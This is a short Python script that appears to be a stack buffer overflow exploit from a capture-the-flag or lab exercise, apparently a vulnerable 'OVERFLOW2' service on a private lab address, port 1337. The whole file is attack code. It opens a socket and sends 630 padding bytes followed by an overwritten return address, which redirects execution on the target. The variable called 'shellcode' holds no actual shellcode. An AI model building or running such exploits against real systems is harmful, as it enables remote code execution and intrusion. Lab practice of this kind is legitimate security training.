#!/usr/bin/python3

import sys, socket
from time import sleep

ip = '10.10.103.180'
port = 1337
prefix = 'OVERFLOW2 /.:/'
#62501205
shellcode = 'A' * 630 + '\x05\x12\x50\x62'

try:
    payload = prefix + shellcode
    print((bytes(payload, "latin-1")))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("trying to connect to the server...")
    s.connect((ip, port))
    print("Connected to the server...")
    s.send((bytes(payload, "latin-1")))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()